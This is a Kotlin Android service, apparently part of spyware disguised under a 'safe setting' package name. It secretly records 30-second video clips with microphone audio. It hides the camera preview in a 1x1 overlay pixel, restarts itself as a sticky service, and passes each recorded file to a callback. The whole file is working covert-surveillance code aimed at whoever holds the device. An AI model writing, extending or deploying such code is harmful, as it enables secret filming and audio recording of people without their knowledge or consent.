package com.safe.setting.app.services.hiddenvideo

import android.Manifest
import android.annotation.SuppressLint
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.view.Gravity
import android.view.Surface
import android.view.WindowManager
import androidx.core.app.ActivityCompat
import com.safe.setting.app.ui.widget.CustomSurfaceView
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraConfig
import com.safe.setting.app.utils.hiddenCameraServiceUtils.CameraError
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
import java.util.*

class HiddenVideoService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var surfaceView: CustomSurfaceView
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var mediaRecorder: MediaRecorder? = null
    private var recordingTimer: Timer? = null

    companion object {
        private const val VIDEO_DURATION_MS = 30000L // 30 seconds
        var videoCallbacks: VideoCallbacks? = null
        @SuppressLint("StaticFieldLeak")
        var cameraConfig: CameraConfig? = null
    }

    override fun onBind(intent: Intent?): IBinder? = null

    @SuppressLint("ClickableViewAccessibility")
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (cameraConfig == null || videoCallbacks == null) {
            stopSelf()
            return START_NOT_STICKY
        }

        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        surfaceView = CustomSurfaceView(this)

        val layoutParamsType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(1, 1, layoutParamsType,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
            PixelFormat.TRANSLUCENT)
        params.gravity = Gravity.START or Gravity.TOP
        windowManager.addView(surfaceView, params)

        startRecording()
        return START_STICKY
    }

    @SuppressLint("MissingPermission")
    private fun startRecording() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED ||
            ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            videoCallbacks?.onCameraError(CameraError.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE)
            stopSelf()
            return
        }

        val cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val cameraId = cameraConfig!!.facing.toString()

        try {
            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close() }
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    videoCallbacks?.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
                    stopSelf()
                }
            }, null)
        } catch (e: CameraAccessException) {
            videoCallbacks?.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
            stopSelf()
        }
    }

    @Suppress("DEPRECATION")
    private fun createCaptureSession() {
        try {
            val videoFile = cameraConfig!!.videoFile!!

            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            mediaRecorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(videoFile.absolutePath)
                setVideoEncodingBitRate(800000)
                setVideoFrameRate(24)
                setVideoSize(640, 480)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)

                val rotation = if (cameraConfig!!.facing == CameraFacing.FRONT_FACING_CAMERA) 270 else 90
                setOrientationHint(rotation)
                prepare()
            }

            val surfaces = ArrayList<Surface>()
            val previewSurface = surfaceView.holder.surface
            surfaces.add(previewSurface)
            val recorderSurface = mediaRecorder!!.surface
            surfaces.add(recorderSurface)

            val captureRequestBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
            captureRequestBuilder.addTarget(previewSurface)
            captureRequestBuilder.addTarget(recorderSurface)

            cameraDevice!!.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    session.setRepeatingRequest(captureRequestBuilder.build(), null, null)
                    mediaRecorder?.start()

                    recordingTimer = Timer()
                    recordingTimer?.schedule(object : TimerTask() {
                        override fun run() {
                            stopRecording()
                        }
                    }, VIDEO_DURATION_MS)
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    videoCallbacks?.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
                    stopSelf()
                }
            }, null)

        } catch (e: Exception) {
            videoCallbacks?.onCameraError(CameraError.ERROR_CAMERA_OPEN_FAILED)
            stopSelf()
        }
    }

    private fun stopRecording() {
        try {
            captureSession?.stopRepeating()
            captureSession?.abortCaptures()
            mediaRecorder?.stop()
            mediaRecorder?.reset()
            mediaRecorder?.release()
            mediaRecorder = null
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null

            Handler(Looper.getMainLooper()).post {
                cameraConfig?.videoFile?.let {
                    if (it.exists() && it.length() > 0) {
                        videoCallbacks?.onVideoRecorded(it)
                    } else {
                        videoCallbacks?.onCameraError(CameraError.ERROR_IMAGE_WRITE_FAILED)
                    }
                }
                stopSelf()
            }
        } catch (e: Exception) {
            // Stopping may fail if already stopped, ignore
        } finally {
            recordingTimer?.cancel()
            recordingTimer = null
        }
    }

    override fun onDestroy() {
        stopRecording()
        if (::surfaceView.isInitialized && surfaceView.windowToken != null) {
            windowManager.removeView(surfaceView)
        }
        super.onDestroy()
    }
}

